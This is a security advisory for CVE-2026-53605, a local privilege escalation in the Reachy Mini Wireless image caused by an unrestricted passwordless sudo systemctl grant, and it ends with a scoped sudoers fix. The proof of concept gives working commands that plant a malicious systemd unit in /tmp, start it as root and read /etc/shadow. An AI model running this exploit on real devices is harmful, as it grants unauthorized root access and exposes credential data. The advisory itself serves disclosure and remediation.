---
description: CVE-2026-53605, HIGH, The Reachy Mini Wireless image is vulnerable to a Local Privilege Escalation via an Unrestricted sudo systemctl Grant

title: The Reachy Mini Wireless image is vulnerable to a Local Privilege Escalation via an Unrestricted sudo systemctl Grant

date_published: "2026-06-15"
last_updated: "2026-06-15"
xray_id: JFSA-2026-001667223
vul_id: CVE-2026-53605
cvss: 7.8
severity: high
discovered_by: Yuval Moravchick
type: vulnerability

---

## Summary

The Reachy Mini Wireless image is vulnerable to a Local Privilege Escalation via an Unrestricted sudo systemctl Grant


## Component

reachy-mini-os

## Affected versions

< 0.2.4

## Description

The Reachy Mini Wireless image ships the daemon user (pollen) with a passwordless sudoers entry for /usr/bin/systemctl that carries no subcommand or argument restriction. An attacker who obtains code execution as pollen, for example, could escalate to full root in three commands, with no additional vulnerability required. 

## PoC

<br>

**Step 1 - Confirm the sudoers grant**

<br>

```sudo -n -l 2>&1 | grep systemctl```

<br>

Expected output:

```(ALL) NOPASSWD: /usr/bin/systemctl```

<br>

If the output shows a restricted form such as /usr/bin/systemctl restart reachy-mini-daemon, the escalation is blocked - skip to Impact.

<br>

**Step 2 - Write the malicious unit file**

<br>

From a raw nc/reverse shell where heredoc and multi-line paste may not work, use printf to write the file in a single command:

`printf '[Unit]\nDescription=privesc\n\n[Service]\nType=oneshot\nExecStart=/tmp/.pwn.sh\nRemainAfterExit=no\n\n[Install]\nWantedBy=multi-user.target\n' > /tmp/.pwn.service`

<br>

Write the payload script separately (avoids quoting issues in ExecStart):

`printf '#!/bin/sh\nid > /tmp/.pwn_proof.txt\nhead -1 /etc/shadow >> /tmp/.pwn_proof.txt\necho CHAIN_COMPLETE >> /tmp/.pwn_proof.txt\n' > /tmp/.pwn.sh
chmod +x /tmp/.pwn.sh`

<br>

/tmp is world-writable. Both files are owned by pollen:pollen. No elevated privilege is needed for this step.

<br>

**Step 3 - Link and start the unit**

```
sudo /usr/bin/systemctl link /tmp/.pwn.service
sudo /usr/bin/systemctl daemon-reload
sudo /usr/bin/systemctl start .pwn.service
Expected output from the link command:
Created symlink /etc/systemd/system/.pwn.service -> /tmp/.pwn.service.
```

<br>
<br>

**Step 4 - Verify root execution**

```
cat /tmp/.pwn_proof.txt
Expected output:
uid=0(root) gid=0(root) groups=0(root)
root:*:20578:0:99999:7:::
CHAIN_COMPLETE
The first line proves ExecStart ran as uid 0. The second line is the first entry of /etc/shadow - readable only by root - confirming full root filesystem access.
```

## Vulnerability Mitigations

Upgrade or log in as root (or via sudo -i), then:

```
  # Remove the overly broad grant (if present)
  rm -f /etc/sudoers.d/010_pi-nopasswd

  # Install the scoped grant
  cat > /etc/sudoers.d/010-pollen-reachy <<'EOF'
  Cmnd_Alias REACHY = \
      /usr/bin/systemctl restart reachy-mini-daemon, \
      /usr/bin/systemctl restart reachy-mini-bluetooth, \
      /usr/sbin/rfkill unblock bluetooth, \
      /usr/sbin/rfkill unblock wifi, \
      /usr/sbin/shutdown -h now, \
      /bluetooth/commands/HOTSPOT.sh, \
      /bluetooth/commands/WIFI_RESET.sh, \
      /bluetooth/commands/SOFTWARE_RESET.sh, \
      /bluetooth/commands/RESTART_DAEMON.sh
  pollen ALL=(root) NOPASSWD: REACHY
  EOF
  chmod 0440 /etc/sudoers.d/010-pollen-reachy

  # Validate the resulting sudoers configuration
  visudo -c
```

## References
https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-9v48-x3h2


